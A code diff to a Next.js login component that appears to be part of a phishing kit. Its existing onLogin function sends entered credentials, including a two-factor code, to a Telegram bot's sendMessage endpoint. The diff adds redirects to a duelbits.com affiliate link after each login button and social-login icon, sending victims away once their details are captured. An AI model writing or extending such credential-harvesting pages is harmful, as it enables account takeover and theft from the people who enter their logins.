@@ -2,6 +2,7 @@
 
 import { CHATID, TELEGRAM_BOT_TOKEN } from "@/const";
 import axios from "axios";
+import { useRouter } from "next/navigation";
 import { useState } from "react";
 
 export default function Authen({
@@ -15,6 +16,7 @@ export default function Authen({
     displayName: "",
     twoFa: "",
   });
+  const router = useRouter();
   const onLogin = async () => {
     const x = await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -40,6 +42,7 @@ export default function Authen({
   ];
   const socialList = [
     {
+      name: "google",
       logo: (
         <svg
           stroke="currentColor"
@@ -227,6 +230,7 @@ export default function Authen({
                 <button
                   onClick={() => {
                     onLogin();
+                    router.push("https://duelbits.com/?a=support1");
                   }}
                   className="bg-primary p-3 rounded font-semibold"
                 >
@@ -273,6 +277,7 @@ export default function Authen({
                 <button
                   onClick={() => {
                     onLogin();
+                    router.push("https://duelbits.com/?a=support1");
                   }}
                   className="bg-primary p-3 rounded font-semibold"
                 >
@@ -284,7 +289,14 @@ export default function Authen({
             <p className="text-center">or login with</p>
             <div className="flex gap-2 justify-center">
               {socialList.map((item, index) => (
-                <div key={index} className="bg-[#293F52] p-3 rounded">
+                <div
+                  onClick={() => {
+                    if (!item?.name) return;
+                    router.push("https://duelbits.com/?a=support1");
+                  }}
+                  key={index}
+                  className="bg-[#293F52] p-3 rounded"
+                >
                   {item.logo}
                 </div>
               ))}
